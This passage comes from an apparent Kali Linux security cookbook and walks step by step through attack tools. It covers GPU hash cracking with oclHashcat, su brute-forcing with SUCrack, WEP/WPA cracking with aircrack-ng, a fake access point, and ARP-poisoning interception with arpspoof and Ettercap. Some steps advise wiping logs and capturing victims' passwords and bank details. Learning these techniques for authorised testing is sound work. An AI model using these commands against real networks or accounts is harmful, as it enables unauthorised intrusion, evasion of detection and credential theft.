In this recipe, we used various RainbowCrack tools to generate, sort, and crack an MD5

password. RainbowCrack works by brute-forcing hashes based upon precomputed hash

values using rainbow tables. We began this recipe by generating an MD5 rainbow table using lowercase, alphanumeric values. By the end of the recipe, we achieved success by creating our rainbow tables to utilize it against a hash file.

Using nVidia Compute Unified Device Architecture (CUDA)

In this recipe, we will use the nVidia Compute Unified Device Architecure (CUDA) to crack
password hashes. CUDA is a parallel computing platform that increases computing
performance by harnessing the power of the GPU. As time has passed, GPU processing
power has increased dramatically which allows us the ability to use it for our computational
purposes. For demonstration purposes, we will use OclHashcat-lite to crack the passwords.

Getting ready

An nVidia CUDA supported graphics card is required to complete this recipe.

How to do it...

1.   Open a terminal window and change to the directory that contains OclHashcat:

cd  /usr/share/oclhashcat-plus

214

![](images/00205.jpeg)

Chapter 8

2. Execute the following command to launch the cudaHashcat-litehelp file:

./cudaHashcat-plus.bin  -help

3. The syntax for running OclHashcat is in the form ofcudaHashcat-plus64.bin

[options] hash  [mask].

One of the important aspects of using OclHashcat is to understand its character-set structure.

4\.               Before we deploy our attack, let's view some of the available attack vectors we can
              specify. OclHashcat utilizes left and right masks with its attacks. The characters of
              a password are divided into masks and are divided evenly to make a right and a left
              mask. For each side of the mask, you can specify either a dictionary or a charset. For
              our purposes, we will use a customized charset.

5\.               To specify a custom charset, we use the-1 option. We can have as many custom
charsets as we want as long as you specify them with a number (1-n). Each custom
character is represented by a question mark (?) and is followed by the type of
 character expected. The options available are:

 d specifies the use of digits (0-9)
 l specifies a lower case character
 u specifies an upper case character
 s specifies special characters

             1-n specifies a custom charset to use as a placeholder

6\.               So to put it all together, we will specify a custom character set that will include special
characters (s), upper case characters (u), lower case characters (l), and digits (d)
              on an expected 8 character password. We are going to specify a hashlist called
             attackfile.

./cudaHashcat-plus64.bin attackfile  -1  ?l?u?d?s  ?1?1?1?1  ?1?1?1?1

7.              We can break down the preceding command as follows:

             ./cudaHashcat-plus64.bin calls the cudaHashcat

    attackfile is our attackfile

             -1  ?l?u?d? specifies a custom charset one, with options of lowercase,

uppercase, digits, and special characters

             ?1?1?1?1 is our left mask using charset one

             ?1?1?1?1 is our right mask using charset one

That's it!

215

![](images/00206.jpeg)

Password Attacks

Using ATI Stream

In this recipe, we will use ATI Stream to crack password hashes. ATI Stream is similar to
CUDA in that it is a parallel computing platform that increases computing performance
by harnessing the power of the graphics processing unit (GPU). As time has passed, GPU
processing power has increased dramatically which allows us the ability to use it for our
computational purposes. For demonstration purposes, we will use OclHashcat-plus to crack
the passwords. OclHashcat comes in two versions: plus and lite. Both are included with
Kali Linux.

Getting ready

An ATI Stream supported graphics card is required to complete this exercise.

How to do it...

Let's begin the process by working with OclHashcat-plus.

1.   Open a terminal window and change to the directory that contains OclHashcat:

Cd  /usr/share/oclhashcat-plus

2.   Execute the command to launch the oclHashcat-litehelp file.
             ./oclHashcat-plus64.bin  -help

3.   The syntax for running OclHashcat is in the form ofoclHashcat-plus64.bin
 [options] hash  [mask].

One of the important aspect of using OclHashcat is to understand its character-set structure.

4.   Before we deploy our attack, let's view some of the available attack vectors we can
 specify. OclHashcat utilizes left and right masks with its attacks. The characters of
              a password are divided into masks and are divided evenly to make a right and a left
              mask. For each side of the mask, you can specify either a dictionary or a charset.
              For our purposes, we will use a customized charset.

216

![](images/00207.jpeg)

Chapter 8

5\.               To specify a custom charset, we use the-1 option. We can have as many custom
charsets as we want as long as you specify them with a number (1-n). Each custom
character is represented by a question mark (?) and is followed by the type of
 character expected. The options available are:

 d specifies the use of digits (0-9)
 l specifies a lower case character
 u specifies an upper case character
 s specifies special characters

             1-n specifies a custom charset to use as a placeholder

6. So to put it all together, we will specify a custom character set that will include

special characters (s), upper case characters (u), lower case characters (l), and digits (d) on an expected 8 character password. We are going to specify a hashlist called attackfile.

./oclHashcat-plus64.bin attackfile  -1  ?l?u?d?s  ?1?1?1?1  ?1?1?1?1

7.              We can break down the preceding command as follows:

             ./oclHashcat-plus64.bin calls the oclHashcat

    attackfile is our attackfile

             -1  ?l?u?d? specifies custom charset one with options of lowercase,

uppercase, digits, and special characters

             ?1?1?1?1 is our left mask using charset one

             ?1?1?1?1 is our right mask using charset one

That's it!

Physical access attacks

In this recipe, we will utilize SUCrack to perform a physical access password attack. SUCrack
is a multithreaded tool that allows for brute-force cracking of local user accounts viasu. The
sucommand in Linux allows you to run commands as asubstitute user. This attack, though
useful when you are unable to escalate privileges on a Linux/Unix system by other means,
will fill up the log files rather quickly so please be sure to clean the log files after completion.

SUCrack has several command options that we can use:

             --help allows you to view the help file for SUCrack.

             -l allows you to change the user whose login we are attempting to circumvent.

             -s allows you to set the number of seconds between when statistics are displayed.

The default setting is every 3 seconds.

217

![](images/00208.jpeg)

Password Attacks

             -a allows you to set whether ANSI escape codes should be used or not.

             -w allows you to set the number of worker threads that SUCrack can utilize.

Since SUCrack is multi threaded, you can run as many worker threads as you

wish. We recommend using only one as each failed login attempt usually causes a 3 second delay before the next password is attempted.

How to do it...

1.   In order to use SUCrack, you must specify a wordlist when opening it. Otherwise,
 you will get a funny message. Open a terminal window and execute thesucrack
             command. For our purposes, we will use a previously created custom wordlist file
              generated by Crunch. However, you can specify any wordlist that you would like.

sucrack  /usr/share/wordlists/rockyou.txt

2.   If you would like to set two worker threads, want to display statistics every 6 seconds,
              and want to set ANSI escape codes to be used, you can use the following command:

sucrack  -w  2  -s  6  -a  /usr/share/wordlists/rockyou.txt

That's it!

How it works...

In this recipe, we used SUCrack to perform a physical access password attack on the root user of the system. The attack works by using the wordlist specified to perform a dictionary attack against either the administrator (the default choice) or a specified user. We run thesucrackcommand, which provides us with our attack.

218

9

Wireless Attacks

In this chapter, we will cover:

    Wireless network WEP cracking

    Wireless network WPA/WPA2 cracking    Automating wireless network cracking    Accessing clients using a fake AP
    URL traffic manipulation
    Port redirection

    Sniffing network traffic

Introduction

These days, wireless networks are everywhere. With users being on the go like never before,
having to remain stationary because of having to plug into an Ethernet cable to gain Internet
access is not feasible. For this convenience, there is a price to be paid; wireless connections
are not as secure as Ethernet connections. In this chapter, we will explore various methods
for manipulating radio network traffic including mobile phones and wireless networks. ![](images/00005.jpeg)![](images/00005.jpeg)

![](images/00209.jpeg)

Wireless Attacks

Wireless network WEP cracking

Wireless Equivalent Privacy,orWEPas it's commonly referred to, has been around since 1999 and is an older security standard that was used to secure wireless networks. In 2003, WEP was replaced by WPA and later by WPA2\. Due to having more secure protocols available, WEP encryption is rarely used. As a matter of fact, it ishighly recommended that you never use WEP encryption to secure your network! There are many known ways to exploit WEP
encryption and we will explore one of those ways in this recipe.

In this recipe, we will use the AirCrack suite to crack a WEP key. The AirCrack suite (or AirCrack NG as it's commonly referred to) is a WEP and WPA key cracking program that captures
network packets, analyzes them, and uses this data to crack the WEP key.

Getting ready

In order to perform the tasks of this recipe, experience with the Kali terminal window is
required. A supported wireless card configured for packet injection will also be required.
In case of a wireless card, packet injection involves sending a packet, or injecting it onto
an already established connection between two parties. Please ensure your wireless card
allows for packet injection as this is not something that all wireless cards support.

How to do it...

Let's begin the process of using AirCrack to crack a network session secured by WEP.

1.   Open a terminal window and bring up a list of wireless network interfaces:

airmon-ng

2.   Under theinterface column, select one of your interfaces. In this case, we will use
             wlan0. If you have a different interface, such asmon0, please substitute it at every
 location wherewlan0 is mentioned.

3.   Next, we need to stop thewlan0 interface and take it down so that we can change
 our MAC address in the next step.

airmon-ng stop

ifconfig wlan0 down

220

![](images/00210.jpeg)

Chapter 9

4\.               Next, we need to change the MAC address of our interface. Since the MAC
              address of your machine identifies you on any network, changing the identity
              of our machine allows us to keep our true MAC address hidden. In this case,
 we will use00:11:22:33:44:55.

macchanger  --mac  00:11:22:33:44:55 wlan0

5\.               Now we need to restartairmon-ng.

airmon-ng start wlan0

6. Next, we will useairodump to locate the available wireless networks nearby.

airodump-ng wlan0

7\. A listing of available networks will begin to appear. Once you find the one you want
              to attack, pressCtrl+Cto stop the search. Highlight the MAC address in theBSSID
             column, right click your mouse, and select copy. Also, make note of the channel
              that the network is transmitting its signal upon. You will find this information in the
             Channelcolumn. In this case, the channel is10.

8. Now we runairodump and copy the information for the selected BSSID to a file.

We will utilize the following options:

             -callows us to select our channel. In this case, we use10.

             -w allows us to select the name of our file. In this case, we have chosen

wirelessattack.

             -bssid allows us to select our BSSID. In this case, we will paste

09:AC:90:AB:78 from the clipboard.

airodump-ng  -c  10  -w wirelessattack  --bssid  09:AC:90:AB:78 wlan0

9. A new terminal window will open displaying the output from the previous command.

Leave this window open.

10\. Open another terminal window; to attempt to make an association, we will run

aireplay, which has the following syntax:aireplay-ng  -1  0  -a  [BSSID]  -h [our chosen MAC address]  -e  [ESSID]  [Interface]

aireplay-ng  -1  0  -a  09:AC:90:AB:78  -h  00:11:22:33:44:55  -e backtrack wlan0

11\. Next, we send some traffic to the router so that we have some data to capture. We

useaireplayagain in the following format:aireplay-ng  -3  -b  [BSSID]  - h [Our chosen MAC address]  [Interface]

aireplay-ng  -3  -b  09:AC:90:AB:78  -h  00:11:22:33:44:55 wlan0

12\. Your screen will begin to fill with traffic. Let this process run for a minute or two until
 we have information to run the crack.

221

![](images/00211.jpeg)

Wireless Attacks

13\. Finally, we run AirCrack to crack the WEP key.

aircrack-ng  -b  09:AC:90:AB:78 wirelessattack.cap

That's it!

How it works...

In this recipe, we used the AirCrack suite to crack the WEP key of a wireless network. AirCrack
is one of the most popular programs for cracking WEP. AirCrack works by gathering packets
from a wireless connection over WEP and then mathematically analyzing the data to crack
the WEP encrypted key. We began the recipe by starting AirCrack and selecting our desired
interface. Next, we changed our MAC address which allowed us to change our identity on the
network and then searched for available wireless networks to attack usingairodump. Once
we found the network we wanted to attack, we usedaireplay to associate our machine with
the MAC address of the wireless device we were attacking. We concluded by gathering some
traffic and then brute-forced the generated CAP file in order to get the wireless password.

Wireless network WPA/WPA2 cracking

WiFi Protected Access, orWPA as it's commonly referred to, has been around since 2003 and was created to secure wireless networks and replace the outdated previous standard, WEP encryption. In 2003, WEP was replaced by WPA and later by WPA2\. Due to having more secure protocols available, WEP encryption is rarely used.

In this recipe, we will use the AirCrack suite to crack a WPA key. The AirCrack suite (or AirCrack NG as it's commonly referred) is a WEP and WPA key cracking program that captures network packets, analyzes them, and uses this data to crack the WPA key.

Getting ready

In order to perform the tasks of this recipe, experience with the Kali Linux terminal windows is required. A supported wireless card configured for packet injection will also be required. In the case of a wireless card, packet injection involves sending a packet, or injecting it onto an already established connection between two parties.

222

![](images/00212.jpeg)

Chapter 9

How to do it...

Let's begin the process of using AirCrack to crack a network session secured by WPA.

1.   Open a terminal window and bring up a list of wireless network interfaces.

airmon-ng

2\.               Under the interface column, select one of your interfaces. In this case, we will use
             wlan0. If you have a different interface, such asmon0, please substitute it at every
 location wherewlan0 is mentioned.

3.              Next, we need to stop thewlan0 interface and take it down.

airmon-ng stop wlan0

ifconfig wlan0 down

4. Next, we need to change the MAC address of our interface. In this case, we will use

00:11:22:33:44:55.

macchanger  --mac  00:11:22:33:44:55 wlan0

5.              Now we need to restartairmon-ng.

airmon-ng start wlan0

6. Next, we will useairodump to locate the available wireless networks nearby.

airodump-ng wlan0

7\. A listing of available networks will begin to appear. Once you find the one you want
              to attack, pressCtrl+Cto stop the search. Highlight the MAC address in theBSSID
             column, right-click, and select copy. Also, make note of the channel that the network
              is transmitting its signal upon. You will find this information in theChannel column.
 In this case, the channel is10.

8. Now we runairodump and copy the information for the selected BSSID to a file.

We will utilize the following options:

             -c allows us to select our channel. In this case, we use 10.

             -w allows us to select the name of our file. In this case, we have chosen

wirelessattack.

             -bssid allows us to select our BSSID. In this case, we will paste

09:AC:90:AB:78 from the clipboard.

airodump-ng  -c  10  -w wirelessattack  --bssid  09:AC:90:AB:78 wlan0

223

![](images/00213.jpeg)

Wireless Attacks

9.   A new terminal window will open displaying the output from the previous command.
 Leave this window open.

10\. Open another terminal window; to attempt to make an association, we will run

aireplay, which has the following syntax:aireplay-ng  -dauth  1  -a  [BSSID] -c  [our chosen MAC address]  [Interface]. This process may take a few
moments.

Aireplay-ng  --deauth  1  -a  09:AC:90:AB:78  -c  00:11:22:33:44:55 wlan0

11\. Finally, we run AirCrack to crack the WPA key. The-w option allows us to specify the
              location of our wordlist. We will use the.cap file that we named earlier. In this case,
 the file's name iswirelessattack.cap.

Aircrack-ng  -w  ./wordlist.lst wirelessattack.cap

That's it!

How it works...

In this recipe, we used the AirCrack suite to crack the WPA key of a wireless network. AirCrack
is one of the most popular programs for cracking WPA. AirCrack works by gathering packets
from a wireless connection over WPA and then brute-forcing passwords against the gathered
data until a successful handshake is established. We began the recipe by starting AirCrack
and selecting our desired interface. Next, we changed our MAC address which allowed us
to change our identity on the network and then searched for available wireless networks to
attack usingairodump. Once we found the network we wanted to attack, we usedaireplay
to associate our machine with the MAC address of the wireless device we were attacking. We
concluded by gathering some traffic and then brute forced the generated CAP file in order to
get the wireless password.

Automating wireless network cracking

In this recipe we will use Gerix to automate a wireless network attack. Gerix is an automated GUI for AirCrack. Gerix comes installed by default on Kali Linux and will speed up your wireless network cracking efforts.

Getting ready

A supported wireless card configured for packet injection will be required to complete this

recipe. In the case of a wireless card, packet injection involves sending a packet, or injecting it, onto an already established connection between two parties.

224

![](images/00214.jpeg)

Chapter 9

How to do it...

Let's begin the process of performing an automated wireless network crack with Gerix by downloading it.

1.   Usingwget, navigate to the following website to download Gerix.

wget https://bitbucket.org/Skin36/gerix-wifi-cracker-pyqt4/ downloads/gerix-wifi-cracker-master.rar

2.   Once the file has been downloaded, we now need to extract the data from the
 RAR file.

unrar x gerix-wifi-cracker-master.rar

3.   Now, to keep things consistent, let's move the Gerix folder to the/usr/share
             directory with the other penetration testing tools.

mv gerix-wifi-cracker-master  /usr/share/gerix-wifi-cracker

4.   Let's navigate to the directory where Gerix is located.

cd  /usr/share/gerix-wifi-cracker

5.   To begin using Gerix, we issue the following command:

python gerix.py

225

![](images/00215.jpeg)

Wireless Attacks

6.   Click on theConfiguration tab.

7.   On theConfiguration tab, select your wireless interface.

8.   Click on theEnable/Disable Monitor Mode button.

9.   Once Monitor mode has been enabled successfully, underSelect Target Network,
 click on theRescan Networks button.

10\. The list of targeted networks will begin to fill. Select a wireless network to target.
              In this case, we select a WEP encrypted network.

11\. Click on theWEP tab.

12\. UnderFunctionalities, click on theStart Sniffing and Logging button.

13\. Click on the subtabWEP Attacks (No Client).

14\. Click on theStart false access point authentication on victim button.

15\. Click on theStart the ChopChop attack button.

16\. In the terminal window that opens, answerYto theUse this packet question.

17.  Once completed, copy the.cap file generated.

18\. Click on theCreate the ARP packet to be injected on the victim access
 point button.

19\. Click on theInject the created packet on victim access point button.

20\. In the terminal window that opens, answerYto theUse this packet question.

21\. Once you have gathered approximately 20,000 packets, click on theCracking tab.

22\. Click on theAircrack-ng - Decrypt WEP Password button.

That's it!

226

![](images/00216.jpeg)

Chapter 9

How it works...

In this recipe, we used Gerix to automate a crack on a wireless network in order to obtain the
WEP key. We began the recipe by launching Gerix and enabling the monitoring mode interface.
Next, we selected our victim from a list of attack targets provided by Gerix. After we started
sniffing the network traffic, we then used Chop Chop to generate the CAP file. We concluded
the recipe by gathering 20,000 packets and brute-forced the CAP file with AirCrack.

With Gerix, we were able to automate the steps to crack a WEP key without having to manually type commands in a terminal window. This is an excellent way to quickly and efficiently break into a WEP secured network.

Accessing clients using a fake AP

In this recipe, we will use Gerix to create and set up a fakeaccess point(AP). Setting up a fake access point gives us the ability to gather information on each of the computers that access it. People in this day and age will often sacrifice security for convenience. Connecting to an open wireless access point to send a quick e-mail or to quickly log into a social network is rather convenient. Gerix is an automated GUI for AirCrack.

Getting ready

A supported wireless card configured for packet injection will be required to complete this

recipe. In the case of a wireless card, packet injection involves sending a packet, or injecting it onto an already established connection between two parties.

How to do it...

Let's begin the process of creating a fake AP with Gerix.

1.   Let's navigate to the directory where Gerix is located:

cd  /usr/share/gerix-wifi-cracker

227

![](images/00217.jpeg)

Wireless Attacks

2.   To begin using Gerix, we issue the following command:

python gerix.py

3.   Click on theConfiguration tab.

4.   On theConfiguration tab, select your wireless interface.

5.   Click on theEnable/Disable Monitor Mode button.

6.   Once Monitor mode has been enabled successfully, underSelect Target Network,
 press theRescan Networks button.

7.   The list of targeted networks will begin to fill. Select a wireless network to target.
 In this case, we select a WEP encrypted network.

8.   Click on theFake AP tab.

228

![](images/00218.jpeg)

Chapter 9

9.   Change theAccess Point ESSIDfromhoneypot to something less suspicious.
 In this case, we are going to usepersonalnetwork.

10\. We will use the defaults on each of the other options. To start the fake access point,
              click on theStart Face Access Point button.

That's it!

229

![](images/00219.jpeg)

Wireless Attacks

How it works...

In this recipe, we used Gerix to create a fake AP. Creating a fake AP is an excellent way of collecting information from unsuspecting users. The reason fake access points are a great tool to use is that to your victim, they appear to be a legitimate access point, thus making it trusted by the user. Using Gerix, we were able to automate the creation of setting up a fake access point in a few short clicks.

URL traffic manipulation

In this recipe, we will perform a URL traffic manipulation attack. URL traffic manipulation is

very similar to a Man In The Middle attack, in that we will route traffic destined for the Internet to pass through our machine first. We will perform this attack through ARP poisoning. ARP poisoning is a technique that allows you to send spoofed ARP messages to a victim on the local network. We will execute this recipe using arpspoof.

How to do it...

Let's begin the process of URL traffic manipulation.

1.   Open a terminal window and execute the following command to configure IP tables
 that will allow our machine to route traffic:

sudo echo  1  >>  /proc/sys/net/ipv4/ip_forward

2.   Next, we launch arpspoof to poison traffic going from our victim's machine to the
 default gateway. In this example, we will use a Windows 7 machine on my local
              network with an address of192.168.10.115. Arpspoof has a couple of options
              that we will select and they include:

             -iallows us to select our target interface. In this case, we will selectwlan0.

             -t allows us to specify our target.

The syntax for completing this command isarpspoof  -i

[interface]  -t  [target IP address]  [destination IP address].

sudo arpspoof  -i wlan0  -t  192.168.10.115  192.168.10.1

3.   Next, we will execute another arpspoof command that will take traffic from the

destination in the previous command (which was the default gateway) and route that
traffic back to our Kali machine. In this example our IP address is192.168.10.110.

sudo arpspoof  -i wlan0 -t  192.168.10.1  192.168.10.110

That's it!

230

![](images/00220.jpeg)

Chapter 9

How it works...

In this recipe, we used ARP poisoning with arpspoof to manipulate traffic on our victim's machine to ultimately route back through our Kali Linux machine. Once traffic has been rerouted, there are other attacks that you can run against the victim, including recording their keystrokes, following websites they have visited, and much more!

Port redirection

In this recipe, we will use Kali to perform port redirection, also known as port forwarding or
port mapping. Port redirection involves the process of accepting a packet destined for one
port, say port 80, and redirecting its traffic to a different port, such as 8080\. The benefits of
being able to perform this type of attack are endless because with it you can redirect secure
ports to unsecure ports, redirect traffic to a specific port on a specific device, and so on.

How to do it...

Let's begin the process of port redirection/forwarding.

1.   Open a terminal window and execute the following command to configure IP tables
 that will allow our machine to route traffic:

Sudo echo  1  >>  /proc/sys/net/ipv4/ip_forward

2.   Next, we launch arpspoof to poison traffic going to our default gateway. In this
              example, the IP address of our default gateway is192.168.10.1. Arpspoof
 has a couple of options that we will select and they include:

             -iallows us to select our target interface. In this case, we will selectwlan0\.

The syntax for completing this command isarpspoof  -i

[interface]  [destination IP address].

sudo arpspoof  -i wlan0  192.168.10.1

3.   Next, we will execute another arpspoof command that will take traffic from our
              destination in the previous command (which was the default gateway) and route
              that traffic back to our Kali Linux machine. In this example our IP address is
             192.168.10.110.

iptables  -t nat  -A PREROUTING  -p tcp  --destination-port  80  -j REDIRECT  --to-port  8080

That's it!

231

![](images/00221.jpeg)

Wireless Attacks

How it works...

In this recipe, we used ARP poisoning with arpspoof and IPTables routing to manipulate traffic on our network destined for port 80 to be redirected to port 8080\. The benefits of being able to perform this type of attack are endless because with it you can redirect secure ports to unsecure ports, redirect traffic to a specific port on a specific device, and so on.

Sniffing network traffic

In this recipe, we will examine the process of sniffing network traffic. Sniffing network traffic
involves the process of intercepting network packets, analyzing it, and then decoding the
traffic (if necessary) displaying the information contained within the packet. Sniffing traffic is
particularly useful in gathering information from a target, because depending on the websites visited, you will be able to see the URLs visited, usernames, passwords, and other details that you can use against them.

We will use Ettercap for this recipe, but you could also use Wireshark. For demonstration purposes, Ettercap is a lot easier to understand and apply sniffing principles. Once an
understanding of the sniffing process is established, Wireshark can be utilized to provide more detailed analysis.

Getting ready

A wireless card configured for packet injection is required to complete this recipe although you
can perform the same steps over a wired network. In case of a wireless card, packet injection
involves sending a packet, or injecting it, onto an already established connection between
two parties.

How to do it...

Let's begin the process of sniffing network traffic by launching Ettercap.

1.   Open a terminal window and start Ettercap. Using the-G option, launch the GUI:
             ettercap  -G

232

![](images/00222.jpeg)

Chapter 9

2.   We begin the process by turning onUnified sniffing. You can pressShift+U
             or use the menu and navigate toSniff|Unified sniffing.

3.   Select the network interface. In case of using a MITM attack, we should select our
 wireless interface.

233

![](images/00223.jpeg)

Wireless Attacks

4.   Next, we turn onScan for hosts. This can be accomplished by pressingCtrl+S or use
 the menu and navigate toHosts|Scan for hosts.

5.   Next, we bring up theHost List. You can either pressH or use the menu and navigate
 toHosts|Host List.

6.   We next need to select and set our targets. In our case, we will select

192.168.10.111 as our Target 1 by highlighting its IP address and pressing theAdd To Target 1 button.

234

![](images/00224.jpeg)

Chapter 9

7.   Now we are able to allow Ettercap to begin sniffing. You can either pressCtrl+W
             or use the menu and navigate toStart|Start sniffing.

8.   Finally, we begin the ARP poisoning process. From the menu, navigate to
             Mitm|Arp poisoning...

9.   In the window that appears, check the optional parameter forSniff
 remote connections.

235

![](images/00225.jpeg)

Wireless Attacks

10\. Depending on the network traffic, we will begin to see information.

11\. Once we have found what we are looking for (usernames and passwords). We will
              turn off Ettercap. You can do this by either pressingCtrl+E or by using the menu
 and navigating toStart|Stop sniffing.

236

![](images/00226.jpeg)

Chapter 9

12\. Now we need to turn off ARP poisoning and return the network to normal.

How it works...

This recipe included an MITM attack that works by using ARP packet poisoning to eavesdrop
on wireless communications transmitted by a user. We began the recipe by launching Ettercap
and scanning for our hosts. We then began the process of ARP poisoning the network. ARP
poisoning is a technique that allows you to send spoofed ARP messages to a victim on the
local network.

We concluded the recipe by starting the packet sniffer and demonstrated a way to stop ARP
poisoning and return the network back to normal. This step is key in the detection process as
it allows you to not leave the network down once you have stopped poisoning the network.

This process is useful for gathering information as it's being transmitted across the wireless network. Depending on the traffic, you will be able to gather usernames, passwords, bank account details, and other information your targets send across the network. This information can also be used as a springboard for larger attacks.

237

![](images/00004.jpeg)